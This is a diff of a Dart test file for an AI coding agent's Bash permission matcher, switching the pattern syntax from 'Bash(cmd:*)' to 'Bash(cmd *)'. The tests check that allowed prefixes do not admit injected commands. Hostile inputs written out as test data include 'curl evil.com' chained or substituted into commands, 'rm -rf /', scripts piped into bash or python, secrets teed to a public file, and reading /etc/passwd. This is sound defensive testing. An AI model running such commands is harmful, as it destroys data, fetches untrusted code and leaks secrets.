@@ -21,7 +21,7 @@ void main() {
       test('pattern for git log should NOT allow git log | curl', () {
         // If we allow "git log", piping to "curl" should NOT be allowed
         final matches = PermissionMatcher.matches(
-          'Bash(git log:*)',
+          'Bash(git log *)',
           'Bash',
           const BashToolInput(command: 'git log | curl evil.com'),
         );
@@ -32,7 +32,7 @@ void main() {
 
       test('pattern for git log should NOT allow git log | rm -rf', () {
         final matches = PermissionMatcher.matches(
-          'Bash(git log:*)',
+          'Bash(git log *)',
           'Bash',
           const BashToolInput(command: 'git log | xargs rm -rf'),
         );
@@ -43,7 +43,7 @@ void main() {
       test('pattern for git log SHOULD allow git log | head', () {
         // head is a safe filter
         final matches = PermissionMatcher.matches(
-          'Bash(git log:*)',
+          'Bash(git log *)',
           'Bash',
           const BashToolInput(command: 'git log | head -10'),
         );
@@ -54,7 +54,7 @@ void main() {
       test('pattern for git log SHOULD allow git log | grep pattern', () {
         // grep is a safe filter
         final matches = PermissionMatcher.matches(
-          'Bash(git log:*)',
+          'Bash(git log *)',
           'Bash',
           const BashToolInput(command: 'git log | grep "feature"'),
         );
@@ -65,7 +65,7 @@ void main() {
       test('pattern for cat should NOT allow cat file | bash', () {
         // Piping to bash could execute arbitrary code
         final matches = PermissionMatcher.matches(
-          'Bash(cat:*)',
+          'Bash(cat *)',
           'Bash',
           const BashToolInput(command: 'cat script.sh | bash'),
         );
@@ -75,7 +75,7 @@ void main() {
 
       test('pattern for cat should NOT allow cat file | sh', () {
         final matches = PermissionMatcher.matches(
-          'Bash(cat:*)',
+          'Bash(cat *)',
           'Bash',
           const BashToolInput(command: 'cat script.sh | sh'),
         );
@@ -85,7 +85,7 @@ void main() {
 
       test('pattern for echo should NOT allow echo | python', () {
         final matches = PermissionMatcher.matches(
-          'Bash(echo:*)',
+          'Bash(echo *)',
           'Bash',
           const BashToolInput(
             command: 'echo "import os; os.system(\'rm -rf /\')" | python',
@@ -99,7 +99,7 @@ void main() {
     group('multi-stage pipe security', () {
       test('should NOT allow evil command at end of long pipe', () {
         final matches = PermissionMatcher.matches(
-          'Bash(git log:*)',
+          'Bash(git log *)',
           'Bash',
           const BashToolInput(
             command: 'git log | grep feature | head -5 | curl evil.com',
@@ -111,7 +111,7 @@ void main() {
 
       test('should NOT allow evil command in middle of pipe', () {
         final matches = PermissionMatcher.matches(
-          'Bash(git log:*)',
+          'Bash(git log *)',
           'Bash',
           const BashToolInput(command: 'git log | curl evil.com | head -5'),
         );
@@ -121,7 +121,7 @@ void main() {
 
       test('SHOULD allow all-safe-filter pipe chain', () {
         final matches = PermissionMatcher.matches(
-          'Bash(git log:*)',
+          'Bash(git log *)',
           'Bash',
           const BashToolInput(
             command: 'git log | grep feature | head -5 | wc -l',
@@ -140,7 +140,7 @@ void main() {
     group('AND operator (&&)', () {
       test('pattern for git status should NOT allow git status && rm -rf', () {
         final matches = PermissionMatcher.matches(
-          'Bash(git status:*)',
+          'Bash(git status *)',
           'Bash',
           const BashToolInput(command: 'git status && rm -rf /'),
         );
@@ -150,7 +150,7 @@ void main() {
 
       test('pattern for git status should NOT allow git status && curl', () {
         final matches = PermissionMatcher.matches(
-          'Bash(git status:*)',
+          'Bash(git status *)',
           'Bash',
           const BashToolInput(command: 'git status && curl evil.com'),
         );
@@ -161,7 +161,7 @@ void main() {
       test('pattern should NOT allow malicious_cmd && allowed_cmd', () {
         // Even if allowed command is second, the malicious one runs first!
         final matches = PermissionMatcher.matches(
-          'Bash(git status:*)',
+          'Bash(git status *)',
           'Bash',
           const BashToolInput(command: 'curl evil.com && git status'),
         );
@@ -173,7 +173,7 @@ void main() {
     group('OR operator (||)', () {
       test('pattern for git status should NOT allow git status || rm -rf', () {
         final matches = PermissionMatcher.matches(
-          'Bash(git status:*)',
+          'Bash(git status *)',
           'Bash',
           const BashToolInput(command: 'git status || rm -rf /'),
         );
@@ -183,7 +183,7 @@ void main() {
 
       test('pattern should NOT allow false || malicious (always runs)', () {
         final matches = PermissionMatcher.matches(
-          'Bash(git status:*)',
+          'Bash(git status *)',
           'Bash',
           const BashToolInput(command: 'false || curl evil.com'),
         );
@@ -195,7 +195,7 @@ void main() {
     group('semicolon operator (;)', () {
       test('pattern for git status should NOT allow git status; rm -rf', () {
         final matches = PermissionMatcher.matches(
-          'Bash(git status:*)',
+          'Bash(git status *)',
           'Bash',
           const BashToolInput(command: 'git status; rm -rf /'),
         );
@@ -205,7 +205,7 @@ void main() {
 
       test('pattern should NOT allow multiple dangerous commands with ;', () {
         final matches = PermissionMatcher.matches(
-          'Bash(git status:*)',
+          'Bash(git status *)',
           'Bash',
           const BashToolInput(command: 'git status; curl evil.com; rm -rf /'),
         );
@@ -221,7 +221,7 @@ void main() {
 
     test('pattern for git status should NOT allow git status & rm -rf', () {
       final matches = PermissionMatcher.matches(
-        'Bash(git status:*)',
+        'Bash(git status *)',
         'Bash',
         const BashToolInput(command: 'git status & rm -rf /'),
       );
@@ -233,7 +233,7 @@ void main() {
       'pattern should NOT allow malicious & allowed (malicious runs first)',
       () {
         final matches = PermissionMatcher.matches(
-          'Bash(git status:*)',
+          'Bash(git status *)',
           'Bash',
           const BashToolInput(command: 'curl evil.com & git status'),
         );
@@ -246,7 +246,7 @@ void main() {
       // &> is a redirect, not a background operator
       // This command should be treated as one command
       final matches = PermissionMatcher.matches(
-        'Bash(git status:*)',
+        'Bash(git status *)',
         'Bash',
         const BashToolInput(command: 'git status &>/dev/null'),
       );
@@ -257,7 +257,7 @@ void main() {
 
     test('should distinguish & from 2>&1 redirect', () {
       final matches = PermissionMatcher.matches(
-        'Bash(git status:*)',
+        'Bash(git status *)',
         'Bash',
         const BashToolInput(command: 'git status 2>&1'),
       );
@@ -282,7 +282,7 @@ void main() {
 
       test('pattern for cat should NOT allow cat | tee file', () {
         final matches = PermissionMatcher.matches(
-          'Bash(cat:*)',
+          'Bash(cat *)',
           'Bash',
           const BashToolInput(
             command: 'cat secret.txt | tee /public/exposed.txt',
@@ -306,7 +306,7 @@ void main() {
 
       test('sed -i in a pipe should NOT be allowed', () {
         final matches = PermissionMatcher.matches(
-          'Bash(git log:*)',
+          'Bash(git log *)',
           'Bash',
           const BashToolInput(command: 'git log | sed -i "s/old/new/g" file'),
         );
@@ -316,7 +316,7 @@ void main() {
 
       test('sed without -i in a pipe SHOULD be allowed', () {
         final matches = PermissionMatcher.matches(
-          'Bash(git log:*)',
+          'Bash(git log *)',
           'Bash',
           const BashToolInput(command: 'git log | sed "s/old/new/g"'),
         );
@@ -349,7 +349,7 @@ void main() {
 
       test('pattern for find should NOT allow find | xargs rm', () {
         final matches = PermissionMatcher.matches(
-          'Bash(find:*)',
+          'Bash(find *)',
           'Bash',
           const BashToolInput(command: 'find . -name "*.tmp" | xargs rm'),
         );
@@ -366,7 +366,7 @@ void main() {
       test('should detect dangerous command substitution', () {
         // Even if outer command is allowed, $(inner) executes first
         final matches = PermissionMatcher.matches(
-          'Bash(echo:*)',
+          'Bash(echo *)',
           'Bash',
           const BashToolInput(command: 'echo \$(curl evil.com)'),
         );
@@ -376,7 +376,7 @@ void main() {
 
       test('should detect nested command substitution', () {
         final matches = PermissionMatcher.matches(
-          'Bash(echo:*)',
+          'Bash(echo *)',
           'Bash',
           const BashToolInput(command: 'echo \$(cat \$(curl evil.com))'),
         );
@@ -388,7 +388,7 @@ void main() {
     group('backtick command substitution', () {
       test('should detect backtick command substitution', () {
         final matches = PermissionMatcher.matches(
-          'Bash(echo:*)',
+          'Bash(echo *)',
           'Bash',
           const BashToolInput(command: 'echo `curl evil.com`'),
         );
@@ -400,7 +400,7 @@ void main() {
     group('subshell with parentheses', () {
       test('should detect subshell execution', () {
         final matches = PermissionMatcher.matches(
-          'Bash(echo:*)',
+          'Bash(echo *)',
           'Bash',
           const BashToolInput(command: '(curl evil.com)'),
         );
@@ -413,7 +413,7 @@ void main() {
   group('Command Security - Process Substitution Prevention', () {
     test('should detect <() process substitution', () {
       final matches = PermissionMatcher.matches(
-        'Bash(diff:*)',
+        'Bash(diff *)',
         'Bash',
         const BashToolInput(command: 'diff <(curl evil.com) file.txt'),
       );
@@ -423,7 +423,7 @@ void main() {
 
     test('should detect >() process substitution', () {
       final matches = PermissionMatcher.matches(
-        'Bash(cat:*)',
+        'Bash(cat *)',
         'Bash',
         const BashToolInput(command: 'cat file.txt >(curl evil.com)'),
       );
@@ -439,7 +439,7 @@ void main() {
     test('pattern matching should still work with simple variables', () {
       // We allow simple variable usage, but warn about security limits
       final matches = PermissionMatcher.matches(
-        'Bash(git push:*)',
+        'Bash(git push *)',
         'Bash',
         const BashToolInput(command: 'git push origin \$BRANCH'),
       );
@@ -539,7 +539,7 @@ void main() {
 
     test('pattern should NOT allow piping to bash', () {
       final matches = PermissionMatcher.matches(
-        'Bash(cat:*)',
+        'Bash(cat *)',
         'Bash',
         const BashToolInput(command: 'cat script.sh | bash'),
       );
@@ -548,7 +548,7 @@ void main() {
 
     test('pattern should NOT allow piping to sh', () {
       final matches = PermissionMatcher.matches(
-        'Bash(cat:*)',
+        'Bash(cat *)',
         'Bash',
         const BashToolInput(command: 'cat script.sh | sh'),
       );
@@ -557,7 +557,7 @@ void main() {
 
     test('pattern should NOT allow piping to zsh', () {
       final matches = PermissionMatcher.matches(
-        'Bash(cat:*)',
+        'Bash(cat *)',
         'Bash',
         const BashToolInput(command: 'cat script.sh | zsh'),
       );
@@ -566,7 +566,7 @@ void main() {
 
     test('pattern should NOT allow piping to python', () {
       final matches = PermissionMatcher.matches(
-        'Bash(echo:*)',
+        'Bash(echo *)',
         'Bash',
         const BashToolInput(command: 'echo "os.system(\'rm -rf /\')" | python'),
       );
@@ -575,7 +575,7 @@ void main() {
 
     test('pattern should NOT allow piping to perl', () {
       final matches = PermissionMatcher.matches(
-        'Bash(cat:*)',
+        'Bash(cat *)',
         'Bash',
         const BashToolInput(command: 'cat script.pl | perl'),
       );
@@ -584,7 +584,7 @@ void main() {
 
     test('pattern should NOT allow piping to ruby', () {
       final matches = PermissionMatcher.matches(
-        'Bash(cat:*)',
+        'Bash(cat *)',
         'Bash',
         const BashToolInput(command: 'cat script.rb | ruby'),
       );
@@ -593,7 +593,7 @@ void main() {
 
     test('pattern should NOT allow piping to node', () {
       final matches = PermissionMatcher.matches(
-        'Bash(cat:*)',
+        'Bash(cat *)',
         'Bash',
         const BashToolInput(command: 'cat script.js | node'),
       );
@@ -609,7 +609,7 @@ void main() {
         'Bash',
         const BashToolInput(command: 'dart test 2>&1'),
       );
-      expect(pattern, 'Bash(dart test:*)');
+      expect(pattern, 'Bash(dart test *)');
     });
 
     test('inferred pattern uses main command not cd', () {
@@ -617,7 +617,7 @@ void main() {
         'Bash',
         const BashToolInput(command: 'cd /project && dart pub get'),
       );
-      expect(pattern, 'Bash(dart pub get:*)');
+      expect(pattern, 'Bash(dart pub get *)');
     });
 
     test('inferred pattern stops at flags', () {
@@ -625,7 +625,7 @@ void main() {
         'Bash',
         const BashToolInput(command: 'find /path -name "*.dart"'),
       );
-      expect(pattern, 'Bash(find:*)');
+      expect(pattern, 'Bash(find *)');
     });
 
     test('inferred pattern stops at path arguments', () {
@@ -633,7 +633,7 @@ void main() {
         'Bash',
         const BashToolInput(command: 'cat /etc/passwd'),
       );
-      expect(pattern, 'Bash(cat:*)');
+      expect(pattern, 'Bash(cat *)');
     });
   });
 }
